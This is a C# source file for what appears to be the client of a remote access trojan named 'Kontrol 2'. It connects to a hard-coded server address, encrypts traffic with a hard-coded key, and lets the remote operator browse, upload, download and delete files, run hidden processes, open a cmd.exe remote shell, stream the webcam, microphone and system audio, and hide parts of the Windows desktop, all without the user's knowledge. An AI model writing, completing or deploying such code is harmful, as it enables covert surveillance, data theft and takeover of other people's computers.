using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Media;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters.Binary;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using AForge;
using AForge.Video;
using AForge.Video.DirectShow;
using NAudio;
using NAudio.CoreAudioApi;
using NAudio.Wave;

namespace Kontrol_2_Client
{
	class Program
	{
		//Dll imports
		[DllImport("user32.dll")]
		static extern IntPtr GetForegroundWindow();
		[DllImport("user32.dll")]
		static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
		[DllImport("user32.dll", SetLastError = true)] 
		static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
		enum GetWindow_Cmd : uint
		{
			GW_HWNDFIRST = 0,
			GW_HWNDLAST = 1,
			GW_HWNDNEXT = 2,
			GW_HWNDPREV = 3,
			GW_OWNER = 4,
			GW_CHILD = 5,
			GW_ENABLEDPOPUP = 6
		}
		[DllImport("user32.dll", SetLastError = true)]
		static extern IntPtr GetWindow(IntPtr hWnd, GetWindow_Cmd uCmd);
		[DllImport("user32.dll", CharSet = CharSet.Auto)] static extern IntPtr SendMessage(IntPtr hWnd, UInt32 Msg, IntPtr wParam, IntPtr lParam);
		private const int WM_COMMAND = 0x111;
		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr FindWindowEx(IntPtr parentHandle, IntPtr childAfter, string className, string windowTitle);
		[DllImport("user32.dll", SetLastError = false)]
		static extern IntPtr GetDesktopWindow();
		static IntPtr GetDesktopSHELLDLL_DefView()
		{
			var hShellViewWin = IntPtr.Zero;
			var hWorkerW = IntPtr.Zero;

			var hProgman = FindWindow("Progman", "Program Manager");
			var hDesktopWnd = GetDesktopWindow();

			// If the main Program Manager window is found
			if (hProgman != IntPtr.Zero)
			{
				// Get and load the main List view window containing the icons.
				hShellViewWin = FindWindowEx(hProgman, IntPtr.Zero, "SHELLDLL_DefView", null);
				if (hShellViewWin == IntPtr.Zero)
				{
					// When this fails (picture rotation is turned ON, toggledesktop shell cmd used ), then look for the WorkerW windows list to get the
					// correct desktop list handle.
					// As there can be multiple WorkerW windows, iterate through all to get the correct one
					do
					{
						hWorkerW = FindWindowEx(hDesktopWnd, hWorkerW, "WorkerW", null);
						hShellViewWin = FindWindowEx(hWorkerW, IntPtr.Zero, "SHELLDLL_DefView", null);
					} while (hShellViewWin == IntPtr.Zero && hWorkerW != IntPtr.Zero);
				}
			}
			return hShellViewWin;
		}
		[DllImport("user32.dll")]
		public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
		private const int SW_SHOW = 1;
		private const int SW_HIDE = 0;

		//Global variables
		private static Socket _clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
		private const int PORT = 100;
		private static Process remoteShell;
		private static StreamReader fromShell;
		private static StreamWriter toShell;
		private static StreamReader error;
		private static string fo_mode = string.Empty;
		private static string fo_path = string.Empty;
		private static long fo_size = 0;
		private static long fo_writeSize = 0;
		private static byte[] recvFile = new byte[1];
		private static FilterInfoCollection videoDevices;
		private static VideoCaptureDevice videoSource;
		private static Encoding uniEncoder = Encoding.Unicode;
		private static WasapiLoopbackCapture internalSource = null;
		private static WaveInEvent audioSource = null;
		static void Main(string[] args)
		{
			Connect();
			RequestLoop();
		}

		private static void Connect()
		{
			int attempts = 0;

			while (!_clientSocket.Connected)
			{
				try
				{
					attempts++;
					Console.Write("\rConnection attempt {0}", attempts);
					_clientSocket.Connect(IPAddress.Parse("192.168.1.6"), PORT);
				}
				catch (SocketException)
				{
					//Console.Clear();
				}
			}

			//Console.Clear();
			Console.WriteLine("Connected!");
		}

		//Reciving commands from the server
		private static void RequestLoop()
		{
			while (true)
			{
				try
				{
					RecieveResponse();
				}
				catch (Exception ex)
				{
					//MessageBox.Show(ex.Message + "\n" + ex.StackTrace);
					_clientSocket.Shutdown(SocketShutdown.Both);
					_clientSocket.Close();
					_clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
					if (videoSource != null)
					{
						videoSource.SignalToStop();
						videoSource.NewFrame -= new NewFrameEventHandler(videoSource_NewFrame);
						videoSource = null;
					}
					if (audioSource != null)
					{
						audioSource.DataAvailable -= new EventHandler<WaveInEventArgs>(audioSource_NewAudio);
						audioSource.StopRecording(); 
					}
					Connect();
					RequestLoop();
				}
			}
		}

		private static void RecieveResponse()
		{
			byte[] buffer = new byte[2048];
			int recieved = _clientSocket.Receive(buffer, SocketFlags.None);
			if (recieved == 0) return;
			byte[] data = new byte[recieved];
			Array.Copy(buffer, data, recieved);

			string cmd = Encoding.Unicode.GetString(data);
			try
			{
				cmd = Decrypt(cmd);
			}
			catch
			{
				//Send("ERROR\n" + ex.Message);
			}
			if (string.IsNullOrEmpty(fo_mode)) Console.WriteLine("Recieved: {0}", cmd);

			new Thread(() => //Multithreaded command processing
			{
				Thread.CurrentThread.Priority = ThreadPriority.Highest;
				if (fo_mode == "download") //LOLL
				{
					DownloadFile(fo_path, data);
				}
				else if (cmd.StartsWith("getinfo-"))
				{
					try
					{
						int myid = int.Parse(cmd.Split('-')[1]); //get own id
						string allinfo = string.Format("infoback-\n{0}\n{1}\n{2}\n{3}\n{4}\n{5}\n{6}\n{7}\n{8}", myid, Environment.MachineName, DateTime.Now, Environment.OSVersion, Environment.UserName, "hwid", Assembly.GetExecutingAssembly().GetName().Version.ToString(), IsAdmin().ToString(), GetActiveWindow());
						Send(allinfo);
					}
					catch (Exception ex)
					{
						Console.WriteLine(ex.Message);
					}
				}
				else if (cmd.StartsWith("cd"))
				{
					Console.WriteLine("!> command recieved");
					try
					{
						string path = cmd.Split('\n')[1];
						if (Directory.Exists(path))
						{
							Console.WriteLine("!> path exists");
							string[] dirs = Directory.GetDirectories(path);
							string[] files = Directory.GetFiles(path);
							//List <string> dir_infos = new List <string>();
							//List<string> file_infos = new List<string>();
							string dir_infos = "";
							string file_infos = "";

							foreach (string dir in dirs)
							{
								file_infos += (Path.GetFileName(Path.GetFullPath(dir).TrimEnd(Path.DirectorySeparatorChar)) + "&" + GetDirectorySize(dir) + "&" + Directory.GetCreationTimeUtc(dir).ToString() + "&" + dir + "&dir") + "\n";
							}

							foreach (string file in files)
							{
								dir_infos += (Path.GetFileName(file) + "&" + new FileInfo(file).Length.ToString() + "&" + File.GetCreationTimeUtc(file).ToString() + "&" + file + "&file") + "\n";
							}
							Send("dir_info#" + file_infos + dir_infos);
							Console.WriteLine("!> response sent");
						}
						else
						{
							Console.WriteLine("!> path doesnt exist... what?");
						}
					}
					catch (Exception ex)
					{
						MessageBox.Show(ex.Message + ex.StackTrace);
					}
				}
				else if (cmd == "list_drives")
				{
					string infos = "";
					DriveInfo[] drives = DriveInfo.GetDrives();

					foreach (DriveInfo drive in drives)
					{
						if (drive.IsReady)
						{
							infos += drive.Name + "&" + drive.TotalSize + "\n";
						}
						else
						{
							infos += drive.Name + "&" + "N/A\n";
						}
					}
					Send("drive_infos#" + infos);
				}
				else if (cmd.StartsWith("file_operation"))
				{
					string[] xsplit = cmd.Split('\n');
					string mode = null;
					string src = null;
					string dest = null;
					string args = null;
					dynamic src_attr = null;
					dynamic dest_attr = null;
					try
					{
						mode = xsplit[1];
						src = xsplit[2];
						dest = xsplit[3];
						args = xsplit[4];
					}
					catch { }
					switch (mode)
					{
						case "file_move":
							dest_attr = File.GetAttributes(dest);
							dest_attr = File.GetAttributes(dest);
							if ((dest_attr & FileAttributes.Directory) != FileAttributes.Directory) //destination path must be a directory!
							{
								dest = Path.GetDirectoryName(dest);
							}
							if ((src_attr & FileAttributes.Directory) == FileAttributes.Directory) //same thing above but on the source
							{
								dest = Path.Combine(dest, Path.GetFileName(src));
								Directory.Move(src, dest);
							}
							else
							{
								dest = Path.Combine(dest, Path.GetFileName(src));
								File.Move(src, dest);
							}
							break;
						case "file_copy":
							dest_attr = File.GetAttributes(dest);
							dest_attr = File.GetAttributes(dest);
							if ((dest_attr & FileAttributes.Directory) != FileAttributes.Directory) //destination path must be a directory!
							{
								dest = Path.GetDirectoryName(dest);
							}
							if ((src_attr & FileAttributes.Directory) == FileAttributes.Directory) //same thing above but on the source
							{
								dest = Path.Combine(dest, Path.GetFileName(src));
								if (Directory.Exists(dest))
								{
									dest += " - Copy";
								}
								MessageBox.Show(dest);
								DirectoryCopy(src, dest, true);
							}
							else
							{
								if (File.Exists(Path.Combine(dest, Path.GetFileName(src))))
								{
									dest = Path.Combine(dest, Path.GetFileNameWithoutExtension(src) + " - Copy" + Path.GetExtension(src));
								}
								else
								{
									dest = Path.Combine(dest, Path.GetFileName(src));
								}
								File.Copy(src, dest);
							}
							Send("dir_refresh");
							break;
						case "file_delete":
							if ((src_attr & FileAttributes.Directory) == FileAttributes.Directory)
							{
								Directory.Delete(src);
							}
							else
							{
								File.Delete(src);
							}
							Send("dir_refresh");
							break;
						case "file_rename":
							if ((src_attr & FileAttributes.Directory) == FileAttributes.Directory)
							{
								Directory.Move(src, dest);
							}
							else
							{
								File.Move(src, dest);
							}
							Send("dir_refresh");
							break;
						case "file_open":
							try
							{
								ProcessStartInfo proc = new ProcessStartInfo();
								proc.UseShellExecute = true;
								proc.FileName = src;
								Process.Start(proc);
							}
							catch { }
							break;
						case "file_create":
							if (Path.HasExtension(src))
							{
								File.Create(src);
							}
							else
							{
								Directory.CreateDirectory(src);
							}
							Send("dir_refresh");
							break;
						case "file_download":
							fo_path = Path.Combine(src, dest);
							fo_size = long.Parse(args);
							fo_mode = "download";
							recvFile = new byte[fo_size];
							Send("file_operation\nfile_beginUpload");
							break;
						case "file_upload":
							fo_path = src;
							Send("file_operation\nfile_beginDownload\n" + new FileInfo(fo_path).Length);
							break;
						case "file_beginUpload":
							byte[] fileData = File.ReadAllBytes(fo_path);
							SendBytes(fileData);
							fileData = null;
							GCSettings.LargeObjectHeapCompactionMode = GCLargeObjectHeapCompactionMode.CompactOnce;
							GC.Collect(); //shit doesnt work even tho lohc is enabled
							break;
						case "file_uploadFinished":
							fo_mode = null;
							break;
					}
				}
				else if (cmd == "list_proceses")
				{
					Process[] procs = Process.GetProcesses();
					foreach (Process proc in procs)
					{
						string name = proc.ProcessName;
						string responding = proc.Responding.ToString();
						string title = proc.MainWindowTitle;
						string priority = "N/A";
						string path = "N/A";
						string pid = proc.Id.ToString();
						try
						{
							priority = proc.PriorityClass.ToString();
							path = proc.Modules[0].FileName;

							string proc_info = "process_info\n" + name + "\n" + pid + "\n" + responding + "\n" + title + "\n" + priority + "\n" + path;
							Send(proc_info);
							Thread.Sleep(10); //Let's be a good citizen to the network
						}
						catch { }
					}
				}
				else if (cmd.Split('\n')[0] == "kill_process")
				{
					try
					{
						Process.GetProcessById(int.Parse(cmd.Split('\n')[1])).Kill();
					}
					catch { }
				}
				else if (cmd.Split('\n')[0] == "create_process")
				{
					try
					{
						string[] xsplit = cmd.Split('\n');
						Process proc = new Process();
						switch (int.Parse(xsplit[1]))
						{
							case -1:
								proc.StartInfo.WindowStyle = ProcessWindowStyle.Normal;
								break;
							case 0:
								proc.StartInfo.WindowStyle = ProcessWindowStyle.Normal;
								break;
							case 1:
								proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
								proc.StartInfo.CreateNoWindow = true;
								break;
							case 2:
								proc.StartInfo.WindowStyle = ProcessWindowStyle.Maximized;
								break;
							case 3:
								proc.StartInfo.WindowStyle = ProcessWindowStyle.Minimized;
								break;
						}
						if (!string.IsNullOrEmpty(xsplit[3]))
						{
							if (!bool.Parse(xsplit[4]))
								proc.StartInfo.Arguments = "/C " + xsplit[3];
							else
								proc.StartInfo.Arguments = xsplit[3];
						}
						proc.StartInfo.UseShellExecute = bool.Parse(xsplit[5]);
						proc.StartInfo.WorkingDirectory = Path.GetDirectoryName(xsplit[2]);
						proc.StartInfo.FileName = xsplit[2];
						proc.Start();
					}
					catch { }
				}
				else if (cmd == "start_remoteshell")
				{
					ProcessStartInfo procinfo = new ProcessStartInfo();
					procinfo.FileName = "cmd.exe";
					procinfo.CreateNoWindow = true;
					procinfo.UseShellExecute = false;
					procinfo.RedirectStandardOutput = true;
					procinfo.RedirectStandardInput = true;
					procinfo.RedirectStandardError = true;

					remoteShell = new Process();
					remoteShell.StartInfo = procinfo;
					remoteShell.Start();
					toShell = remoteShell.StandardInput;
					fromShell = remoteShell.StandardOutput;
					error = remoteShell.StandardError;
					toShell.AutoFlush = true;

					try
					{
						string tempBuf = "";
						string tempError = "";
						string edata = "";
						string sdata = "";

						while ((tempBuf = fromShell.ReadLine()) != null && !remoteShell.HasExited)
						{
							sdata += tempBuf + "\r";
							Send("cmd_out\n" + sdata);
							sdata = "";
						}
						while ((tempError = error.ReadLine()) != null && !remoteShell.HasExited)
						{
							edata += edata + tempError + "\r";
							Send("cmd_out\n" + edata);
							edata = "";
						}
					}
					catch (Exception ex)
					{
						MessageBox.Show(ex.Message + "\n" + ex.StackTrace);
						Send("cmdout\nError while trying to read from the shell: " + ex.Message);
					}
				}
				else if (cmd.StartsWith("cmd_in"))
				{
					toShell.WriteLine(cmd.Split('\n')[1]);
				}
				else if (cmd == "cmd_kill")
				{
					remoteShell.Kill();
				}
				else if (cmd.StartsWith("element"))
				{
					string element = cmd.Split('\n')[1];
					string action = cmd.Split('\n')[2];

					switch (element)
					{
						case "taskbar":
							if (action == "hide")
								HTaskBar(true);
							else
								HTaskBar(false);
							break;
						case "desktopIcons":
							if (action == "hide")
								HDesktop();
							else
								HDesktop();
							break;
						case "trayIcons":
							if (action == "hide")
								HTrayIcons(true);
							else
								HTrayIcons(false);
							break;
						case "startMenu":
							if (action == "hide")
								HStart(true);
							else
								HStart(false);
							break;
						case "clock":
							if (action == "hide")
								HClock(true);
							else
								HClock(false);
							break;
					}
				}
				else if (cmd.Split('\n')[0] == "play_systemsound")
				{
					switch (int.Parse(cmd.Split('\n')[1]))
					{
						case 0:
							SystemSounds.Hand.Play();
							break;
						case 1:
							SystemSounds.Beep.Play();
							break;
					}
				}
				else if (cmd == "play_soundfile")
				{
					

				}
				else if (cmd.Split('\n')[0] == "t2s_read")
				{

				}
				else if (cmd.Split('\n')[0] == "play_frequency")
				{
					string[] xsplit = cmd.Split('\n');
					Console.Beep(int.Parse(xsplit[1]), int.Parse(xsplit[2]));
				}
				else if (cmd.StartsWith("remote_webcam"))
				{
					try
					{
						string[] xsplit = cmd.Split('\n');
						switch (xsplit[1])
						{
							case "capture_devices":
								int i = 0;
								string devices = "";
								videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
								foreach (FilterInfo device in videoDevices)
								{
									if (i == videoDevices.Count - 1)
										devices += device.Name;
									else
										devices += device.Name + "&";
									i++;
								}
								Send("remote_webcam\ndevices\n" + devices);
								break;
							case "device_resolutions":
								string resolutions = "";
								videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
								videoSource = new VideoCaptureDevice(videoDevices[int.Parse(xsplit[2])].MonikerString);
								for (int x = 0; x < videoSource.VideoCapabilities.Length; x++)
								{
									string resolution_size = videoSource.VideoCapabilities[x].FrameSize.ToString();
									Console.WriteLine(resolution_size);
									if (x == videoSource.VideoCapabilities.Length)
										resolutions += resolution_size;
									else
										resolutions += resolution_size + "&";
								}
								Send("remote_webcam\ndevice_resolutions\n" + resolutions);
								break;
							case "begin_stream":
								string[] args = xsplit[2].Split('&');
								Send("remote_webcam\nstart_display");
								WebCam_Stream(int.Parse(args[0]), int.Parse(args[1]));
								break;
							case "end_stream":
								videoSource.SignalToStop();
								videoSource.NewFrame -= new NewFrameEventHandler(videoSource_NewFrame);
								videoSource = null;
								videoDevices = null;
								break;
						}
					}
					catch { }
				}
				else if (cmd.StartsWith("remote_audio"))
				{
					string[] xsplit = cmd.Split('\n');
					switch (xsplit[1])
					{
						case "audio_devices":
							string devices = "";
							int waveInDevices = WaveIn.DeviceCount;
							for (int i = 0; i < waveInDevices; i++)
							{
								WaveInCapabilities device = WaveIn.GetCapabilities(i);
								if (i == waveInDevices - 1)
									devices += device.ProductName;
								else
									devices += device.ProductName + "&";
							}
							Send("remote_audio\naudio_devices\n" + devices);
							break;
						case "begin_stream":
							string[] args = xsplit[2].Split('&');
							Send("remote_audio\nstart_display");
							Audio_Stream(int.Parse(args[0]));
							break;
						case "end_stream":
							if (internalSource == null)
							{
								audioSource.DataAvailable -= audioSource_NewAudio;
								audioSource.StopRecording();
							}
							else
							{
								internalSource.DataAvailable -= audioSource_NewAudio;
								internalSource.StopRecording();
							}
							break;
					}
				}
				else if (cmd.StartsWith("display_msgbox"))
				{
					string[] xsplit = cmd.Split('\n');
					SystemSound ss = null;
					MessageBoxIcon icon = MessageBoxIcon.None;
					MessageBoxButtons buttons = MessageBoxButtons.OK;
					switch (int.Parse(xsplit[4]))
					{
						case 0:
							icon = MessageBoxIcon.Asterisk;
							ss = SystemSounds.Asterisk;
							break;
						case 1:
							icon = MessageBoxIcon.Error;
							ss = SystemSounds.Hand;
							break;
						case 2:
							icon = MessageBoxIcon.Exclamation;
							ss = SystemSounds.Exclamation;
							break;
						case 3:
							icon = MessageBoxIcon.Hand;
							ss = SystemSounds.Hand;
							break;
						case 4:
							icon = MessageBoxIcon.Information;
							ss = SystemSounds.Asterisk;
							break;
						case 5:
							icon = MessageBoxIcon.None;
							ss = null;
							break;
						case 6:
							icon = MessageBoxIcon.Question;
							ss = SystemSounds.Asterisk;
							break;
						case 7:
							icon = MessageBoxIcon.Stop;
							ss = SystemSounds.Hand;
							break;
						case 8:
							icon = MessageBoxIcon.Warning;
							ss = SystemSounds.Hand;
							break;
					}
					switch (int.Parse(xsplit[5]))
					{
						case 0:
							buttons = MessageBoxButtons.AbortRetryIgnore;
							break;
						case 1:
							buttons = MessageBoxButtons.OK;
							break;
						case 2:
							buttons = MessageBoxButtons.OKCancel;
							break;
						case 3:
							buttons = MessageBoxButtons.RetryCancel;
							break;
						case 4:
							buttons = MessageBoxButtons.YesNo;
							break;
						case 5:
							buttons = MessageBoxButtons.YesNoCancel;
							break;
					}
					MessageBox.Show(xsplit[3], xsplit[2], buttons, icon);
				}
			}).Start();
		}

		public static string Encrypt(string text)
		{
			string key = "D(G+KbPeSg";
			byte[] clearBytes = Encoding.Unicode.GetBytes(text);
			using (Aes encryptor = Aes.Create())
			{
				Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(key, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
				encryptor.Key = pdb.GetBytes(32);
				encryptor.IV = pdb.GetBytes(16);

				using (MemoryStream ms = new MemoryStream())
				{
					using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateEncryptor(), CryptoStreamMode.Write))
					{
						cs.Write(clearBytes, 0, clearBytes.Length);
						cs.Close();
					}
					text = Convert.ToBase64String(ms.ToArray());
				}
			}
			return text;
		}
		public static string Decrypt(string text)
		{
			string key = "D(G+KbPeSg";
			byte[] cipherBytes = Convert.FromBase64String(text);
			using (Aes encryptor = Aes.Create())
			{
				Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(key, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
				encryptor.Key = pdb.GetBytes(32);
				encryptor.IV = pdb.GetBytes(16);

				using (MemoryStream ms = new MemoryStream())
				{
					using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write))
					{
						cs.Write(cipherBytes, 0, cipherBytes.Length);
						cs.Close();
					}
					text = Encoding.Unicode.GetString(ms.ToArray());
				}
			}
			return text;
		}
		private static long GetDirectorySize2(string folderPath)
		{
			DirectoryInfo di = new DirectoryInfo(folderPath);
			return di.EnumerateFiles("*", SearchOption.AllDirectories).Sum(fi => fi.Length);
		}
		static long GetDirectorySize(string path)
		{
			try
			{
				// 1
				// Get array of all file names.
				string[] a = Directory.GetFiles(path, "*.*");

				// 2
				// Calculate total bytes of all files in a loop.
				long b = 0;
				foreach (string name in a)
				{
					// 3
					// Use FileInfo to get length of each file.
					FileInfo info = new FileInfo(name);
					b += info.Length;
				}
				// 4
				// Return total size
				return b;
			}
			catch { return 0; }
		}
		public static long GetDirectorySizeOld(DirectoryInfo d)
		{
			long size = 0;
			// Add file sizes.
			FileInfo[] fis = d.GetFiles();
			foreach (FileInfo fi in fis)
			{
				size += fi.Length;
			}
			// Add subdirectory sizes.
			DirectoryInfo[] dis = d.GetDirectories();
			foreach (DirectoryInfo di in dis)
			{
				size += GetDirectorySizeOld(di);
			}
			return size;
		}
		public static void HClock(bool hide)
		{
			if (hide)
				ShowWindow(FindWindowEx(FindWindowEx(FindWindow("Shell_TrayWnd", null), IntPtr.Zero, "TrayNotifyWnd", null), IntPtr.Zero, "TrayClockWClass", null), SW_HIDE);
			else
				ShowWindow(FindWindowEx(FindWindowEx(FindWindow("Shell_TrayWnd", null), IntPtr.Zero, "TrayNotifyWnd", null), IntPtr.Zero, "TrayClockWClass", null), SW_SHOW);
		}
		public static void HTaskBar(bool hide)
		{
			if (hide)
				ShowWindow(FindWindow("Shell_TrayWnd", null), SW_HIDE);
			else
				ShowWindow(FindWindow("Shell_TrayWnd", null), SW_SHOW);
		}
		public static void HDesktop()
		{
			var toggleDesktopCommand = new IntPtr(0x7402);
			SendMessage(GetDesktopSHELLDLL_DefView(), WM_COMMAND, toggleDesktopCommand, IntPtr.Zero);
		}
		public static void HTrayIcons(bool hide)
		{
			if (hide)
				ShowWindow(FindWindowEx(FindWindow("Shell_TrayWnd", null), IntPtr.Zero, "TrayNotifyWnd", null), SW_HIDE);
			else
				ShowWindow(FindWindowEx(FindWindow("Shell_TrayWnd", null), IntPtr.Zero, "TrayNotifyWnd", null), SW_SHOW);
		}
		public static void HStart(bool hide)
		{
			if (hide)
				ShowWindow(FindWindow("Button", null), SW_HIDE);
			else
				ShowWindow(FindWindow("Button", null), SW_SHOW);
		}
		public static async void TextToSpeech(string text)
		{
			//var config = SpeechConfig.FromSubscription("Real-time Speech-to-text", "<paste-your-speech-location/region-here>");
			//using var synthesizer = new SpeechSynthesizer(config);
			//await synthesizer.SpeakTextAsync("Synthesizing directly to speaker output.");
		} //CONTINUE!!!!!!!!!!!!!!!!!!!!!
		public static void WebCam_Stream(int deviceId = 0, int resIndex = 0)
		{
			videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
			videoSource = new VideoCaptureDevice(videoDevices[deviceId].MonikerString);
			videoSource.VideoResolution = videoSource.VideoCapabilities[resIndex];
			videoSource.NewFrame += new NewFrameEventHandler(videoSource_NewFrame);
			videoSource.Start();
		}
		private static void videoSource_NewFrame(object sender, NewFrameEventArgs e)
		{
			try
			{
				Bitmap frame = (Bitmap)e.Frame.Clone();
				ImageConverter convert = new ImageConverter();
				byte[] header = uniEncoder.GetBytes("servmod^wcstream");
				byte[] frameBytes = (byte[])convert.ConvertTo(frame, typeof(byte[]));
				byte[] data = new byte[frameBytes.Length + 32];

				Buffer.BlockCopy(header, 0, data, 0, header.Length);
				Buffer.BlockCopy(frameBytes, 0, data, header.Length, frameBytes.Length);

				_clientSocket.Send(data, 0, data.Length, SocketFlags.None);

				frame.Dispose();
			}
			catch { }
		}
		private static void Audio_Stream(int deviceId = 0)
		{
			if (deviceId == -5)
			{
				internalSource = new WasapiLoopbackCapture();
				internalSource.DataAvailable += audioSource_NewAudio;
				internalSource.RecordingStopped += (s, a) =>
				{
					internalSource.Dispose();
					internalSource = null;
				};
				internalSource.StartRecording();
			}
			else
			{
				audioSource = new WaveInEvent();
				audioSource.DeviceNumber = deviceId;
				audioSource.WaveFormat = new WaveFormat(44100, 16, WaveIn.GetCapabilities(deviceId).Channels); 
				audioSource.DataAvailable += audioSource_NewAudio;
				audioSource.RecordingStopped += (s, a) =>
				{
					audioSource.Dispose();
					audioSource = null;
				};
				audioSource.StartRecording(); 
			}
		}
		private static void audioSource_NewAudio(object sender, WaveInEventArgs e)
		{
			byte[] header = uniEncoder.GetBytes("servmod^austream");
			byte[] audioBytes = e.Buffer;
			byte[] data = new byte[e.BytesRecorded + 32];

			Buffer.BlockCopy(header, 0, data, 0, header.Length);
			Buffer.BlockCopy(audioBytes, 0, data, header.Length, audioBytes.Length);

			_clientSocket.Send(data, 0, data.Length, SocketFlags.None);
		}
		public static void DownloadFile(string path, byte[] data)
		{
			Buffer.BlockCopy(data, 0, recvFile, (int)fo_writeSize, data.Length); //so buffer.blockcopy is faster than array.copy
			fo_writeSize += data.Length; //Increment the received file size
			if (fo_writeSize == fo_size) //prev. recvFile.Length == fup_size
			{
				using (FileStream fs = File.Create(path))
				{
					fs.Write(recvFile, 0, recvFile.Length);
				}
				fo_writeSize = 0;
				fo_mode = string.Empty;
				Array.Clear(recvFile, 0, recvFile.Length);
				recvFile = null;
				GC.Collect(); //let's be a good citizen to the memory
				Send("file_operation\nfile_uploadFinished");
				Send("dir_refresh");
			}
		}
		public static dynamic DownloadFileOld(Socket _socket, string path, bool returnBytes = false)
		{
			/*dynamic returnValue = null;
			if (returnBytes)
			{
				byte[] clientData = new byte[1024 * 5000];
				int recievedBytesLen = _socket.Receive(clientData);
				int fileNameLen = BitConverter.ToInt32(clientData, 0);
				string fileName = Encoding.ASCII.GetString(clientData, 4, fileNameLen);
				returnValue = clientData;
				//BinaryWriter bWrite = new BinaryWriter(File.Open(Path.Combine(path + fileName.Replace(@"\", "/").Split('/')[fileName.Replace(@"\", "/").Split('/').Length - 1]), FileMode.Create));
				//bWrite.Write(clientData, 4 + fileNameLen, recievedBytesLen - 4 - fileNameLen);
				//bWrite.Close();
				//returnValue = Path.Combine(path + fileName.Replace(@"\", "/").Split('/')[fileName.Replace(@"\", "/").Split('/').Length - 1]);
				//returnValue = null;
			}
			else
			{
				byte[] clientData = new byte[1024 * 5000];
				int recievedBytesLen = _socket.Receive(clientData);
				int fileNameLen = BitConverter.ToInt32(clientData, 0);
				string fileName = Encoding.Unicode.GetString(clientData, 4, fileNameLen);
				BinaryWriter bWrite = new BinaryWriter(File.Open(Path.Combine(path + fileName.Replace(@"\", "/").Split('/')[fileName.Replace(@"\", "/").Split('/').Length - 1]), FileMode.Create));
				bWrite.Write(clientData, 4 + fileNameLen, recievedBytesLen - 4 - fileNameLen);
				bWrite.Close();
				returnValue = Path.Combine(path + fileName.Replace(@"\", "/").Split('/')[fileName.Replace(@"\", "/").Split('/').Length - 1]);
			}
			fo_mode = "null";*/
			return 0;
		}
		private static void DirectoryCopy(string sourceDirName, string destDirName, bool copySubDirs) //microsoft code lol
		{
			// Get the subdirectories for the specified directory.
			DirectoryInfo dir = new DirectoryInfo(sourceDirName);

			if (!dir.Exists)
			{
				throw new DirectoryNotFoundException(
					"Source directory does not exist or could not be found: "
					+ sourceDirName);
			}

			DirectoryInfo[] dirs = dir.GetDirectories();

			// If the destination directory doesn't exist, create it.       
			Directory.CreateDirectory(destDirName);

			// Get the files in the directory and copy them to the new location.
			FileInfo[] files = dir.GetFiles();
			foreach (FileInfo file in files)
			{
				string tempPath = Path.Combine(destDirName, file.Name);
				file.CopyTo(tempPath, false);
			}

			// If copying subdirectories, copy them and their contents to new location.
			if (copySubDirs)
			{
				foreach (DirectoryInfo subdir in dirs)
				{
					string tempPath = Path.Combine(destDirName, subdir.Name);
					DirectoryCopy(subdir.FullName, tempPath, copySubDirs);
				}
			}
		}
		private static void Send(string response)
		{
			string r = response;

			string encrypted = Encrypt(r);
			byte[] data = Encoding.Unicode.GetBytes(encrypted);
			_clientSocket.Send(data);
		}
		public static void SendBytes(byte[] data)
		{
			Socket s = _clientSocket;
			s.Send(data);
		}
		private static string GetActiveWindow()
		{
			const int nChars = 256;
			StringBuilder Buff = new StringBuilder(nChars);
			IntPtr handle = GetForegroundWindow();

			if (GetWindowText(handle, Buff, nChars) > 0)
			{
				return Buff.ToString();
			}
			return null;
		}
		public static bool IsAdmin()
		{
			using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
			{
				WindowsPrincipal principal = new WindowsPrincipal(identity);
				return principal.IsInRole(WindowsBuiltInRole.Administrator);
			}
		}
	}
}
